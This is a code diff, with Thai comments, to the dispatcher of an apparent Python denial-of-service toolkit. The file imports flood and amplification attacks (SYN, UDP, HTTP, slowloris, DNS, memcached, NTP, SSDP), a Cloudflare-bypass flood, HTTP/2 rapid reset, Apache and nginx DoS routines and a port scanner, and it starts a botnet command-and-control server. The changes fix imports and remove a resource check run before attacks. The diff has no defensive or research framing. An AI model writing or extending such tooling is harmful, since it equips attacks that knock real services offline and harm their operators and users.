@@ -2,18 +2,19 @@ import threading  # นำเข้าโมดูล threading สำหรั�
 import socket  # นำเข้าโมดูล socket สำหรับการเชื่อมต่อเครือข่าย
 import asyncio  # นำเข้าโมดูล asyncio สำหรับการทำงานแบบ async
 import os  # นำเข้าโมดูล os สำหรับจัดการไฟล์และระบบปฏิบัติการ
-from .config import CONFIG  # นำเข้าการตั้งค่าจาก config
-from .utils import load_file_lines  # นำเข้าฟังก์ชันโหลดไฟล์
-from .security import (  # นำเข้าฟังก์ชันความปลอดภัย
+from src.config import CONFIG  # นำเข้าการตั้งค่าจาก config
+from src.utils import load_file_lines  # นำเข้าฟังก์ชันโหลดไฟล์
+from src.security import (  # นำเข้าฟังก์ชันความปลอดภัย
     check_system_resources, increment_thread_counter, decrement_thread_counter,
     validate_target, ResourceMonitor
 )
-from .attacks import (  # นำเข้าฟังก์ชันโจมตีต่างๆ
+from src.attacks import (  # นำเข้าฟังก์ชันโจมตีต่างๆ
     http_flood, async_http_flood, syn_flood, udp_flood,  # ฟังก์ชันโจมตี Layer 4 และ 7
     slowloris_attack, ntp_amplification, cloudflare_bypass_flood,  # ฟังก์ชันโจมตีพิเศษ
     memcached_amplification, ssdp_amplification, dns_amplification,  # ฟังก์ชันโจมตี Amplification
     rudy_attack, hoic_attack,  # ฟังก์ชันโจมตีพิเศษอื่นๆ
-    http2_rapid_reset, apache_killer, nginx_range_dos  # ฟังก์ชันโจมตี Application Layer Exploits
+    http2_rapid_reset, apache_killer, nginx_range_dos,  # ฟังก์ชันโจมตี Application Layer Exploits
+    port_scanner
 )
 
 
@@ -188,11 +189,6 @@ class AttackDispatcher:  # คลาสสำหรับจัดการก�
             print("Invalid parameters provided!")  # แสดงข้อความพารามิเตอร์ไม่ถูกต้อง
             return  # ออกจากฟังก์ชัน
 
-        # Check system resources before attack  # สำหรับตรวจสอบทรัพยากรระบบก่อนโจมตี
-        if not check_system_resources():  # ถ้าทรัพยากรระบบไม่เพียงพอ
-            print("System resources are too low to start attack!")  # แสดงข้อความทรัพยากรไม่เพียงพอ
-            return  # ออกจากฟังก์ชัน
-
         # Special cases  # สำหรับกรณีพิเศษ
         if choice == "7":  # ถ้าเลือก C2 server
             c2 = BotnetC2(port=params["c2_port"])  # สร้างออบเจ็กต์ C2
@@ -204,7 +200,7 @@ class AttackDispatcher:  # คลาสสำหรับจัดการก�
 
         # Prepare target URL/IP  # สำหรับเตรียมเป้าหมาย
         target = params["target"]  # รับค่าเป้าหมาย
-        port = params["port"]  # รับค่าพอร์ต
+        port = params.get("port", 0)  # รับค่าพอร์ต (ถ้าไม่มีให้เป็น 0)
         duration = params["duration"]  # รับค่าระยะเวลา
         threads = params["threads"]  # รับค่าจำนวนเธรด
         proxies = params["proxies"]  # รับค่ารายการพร็อกซี
@@ -270,5 +266,4 @@ class AttackDispatcher:  # คลาสสำหรับจัดการก�
             nginx_range_dos(url, duration, proxies)  # เรียกฟังก์ชันโจมตี
 
         elif choice == "17":  # Port Scanner
-            from .attacks import port_scanner
             port_scanner(target, params["ports"], threads)
